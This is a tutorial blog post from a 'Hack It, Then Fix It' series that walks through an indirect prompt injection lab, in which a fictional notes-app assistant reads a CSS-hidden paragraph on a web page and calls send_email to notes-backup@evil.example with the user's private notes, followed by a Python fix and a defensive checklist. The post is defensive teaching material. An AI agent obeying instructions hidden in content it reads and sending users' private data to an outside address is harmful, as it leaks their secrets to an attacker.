---
title: A Hidden Paragraph on a Web Page Made My AI Agent Email My Secrets
published: false
description: A hands-on indirect prompt injection lab. An AI assistant summarises a blog post and quietly emails private notes to an attacker. Then we fix it in code.
tags: security, ai, llm, tutorial
series: Hack It, Then Fix It
cover_image: https://raw.githubusercontent.com/usinha79/hack-it-then-fix-it/51d6d5de2f62f147e3100b34439cc91513a79dbf/thumbs/ep02_thumb_A.jpg
---

NestBot is the AI assistant inside NoteNest, a made-up notes app. It can do two useful things: read a web page for you, and send emails for you.

You ask it to summarise a blog post. You get a perfectly normal summary. And in the background, NestBot has just emailed your private notes to an attacker.

The blog post had a paragraph you couldn't see, hidden with CSS and addressed to AI assistants. NestBot read it as an instruction and called `send_email(to='notes-backup@evil.example', ...)`. Nothing in the reply looked wrong.

This is **indirect prompt injection** (OWASP LLM01): the attacker never talks to your AI. They leave instructions somewhere your AI will read them.

{% embed https://youtu.be/qTyDNKurNWk %}

## Why it worked

1. **Private data was always in the context.** The notes were in every prompt, even when the task was "summarise a page".
2. **Untrusted content was mixed with instructions.** Page text went straight into the conversation, and a model can't reliably tell data from commands.
3. **The side-effect tool had no guardrails.** `send_email` sent anything, to anyone, with no confirmation.

## The fix, in code

The model still gets tricked. The app makes sure that being tricked can't send your data anywhere.

```python
def send_email(args, state):
    to = args.get("to", "")
    typed = re.findall(EMAIL, state["turn"]["user"])
    # 1. Only send to an address the user typed themselves in this request.
    if to not in typed:
        return f"BLOCKED: {to} is not an address you asked me to email."
    # 2. After reading a web page, side effects need the user's explicit OK.
    if state["turn"]["untrusted"]:
        return "BLOCKED: this request read untrusted web content. Approve the email first."
    state["outbox"].append({"to": to, "body": args["body"]})
    return f"Email sent to {to}."
```

3. **Least data.** Notes only enter the context when the user actually asks about their notes, so a summarise request has nothing private to leak.

Same page, run again: you get the summary, the email is blocked, and the outbox stays empty.

## Run the lab yourself

```bash
git clone https://github.com/usinha79/hack-it-then-fix-it
cd hack-it-then-fix-it/ep02-indirect-prompt-injection
pip install -r requirements.txt

python vulnerable/app.py   # then, in another terminal: ./attack.sh
python fixed/app.py        # same page, email blocked
```

The "attacker's page" is served from your own machine and no email ever leaves it: an Outbox panel shows what would have been sent. Full lab: [github.com/usinha79/hack-it-then-fix-it](https://github.com/usinha79/hack-it-then-fix-it/tree/main/ep02-indirect-prompt-injection)

## Take-home checklist

- Treat everything an agent reads (web pages, emails, files, tool output) as untrusted.
- Side-effect tools (email, payments, posting) need policy checks in code and, after untrusted input, user approval.
- Only put private data in context when the task needs it.
- Log and show the user every action the agent took.

---

*Hack It, Then Fix It is a series where I build a small AI app with a real flaw, break it, fix it in code, and run the same attack again to prove the fix holds. Everything shown uses fake data on my own machine. Only test systems you own or are authorised to test.*
